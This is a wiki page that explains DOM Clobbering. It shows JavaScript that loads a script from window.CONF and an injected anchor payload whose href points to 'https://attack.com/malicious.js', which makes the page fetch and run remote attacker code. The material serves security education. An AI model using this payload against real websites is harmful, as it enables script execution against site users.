---
title: Examples
parent: Techniques
nav_order: 6
---

{% include toggle_color.html %}

# DOM Clobbering Wiki

Stable
{: .label .label-green }


## DOM Clobbering Examples

This section presents a few simple, hands-on examples of DOM Clobbering, capturing the corner-case behaviours of browsers for exploitation.


### Implicit Cast of HTMLAnchorElement to Href String

Consider the following code listing:

```js
1. var s = document.createElement('script');
2. s.src = window.CONF || 'custom-script.js';
3. document.body.appendChild(s);
```

Attackers can obtain arbitrary code execution by clobbering the `window.CONF` property in line 2, as it is used as the `src` attribute of a dynamically loaded script

For successful exploitation, the value of `window.CONF` must be an `string`, and with DOM Clobbering we replace it with an `HTMLElement` or `WindowProxy`, which could prevent us from exploiting this vulnerability. However, when assigning a value to `HTMLScriptElement.src`, if the value is an instance of `HTMLAnchorElement`, the browser implicitly casts the value to its `href` property value. 

**Exploitation.** To exploit the above code lisiting, attackers can inject the following payload:

```html
<a id=CONF href="https://attack.com/malicious.js">
```

Note that while `window.CONF` refers to an `HTMLAnchorElement`, the assignment to `HTMLScriptElement.src` on line 2 casts it to its `href` property value. 


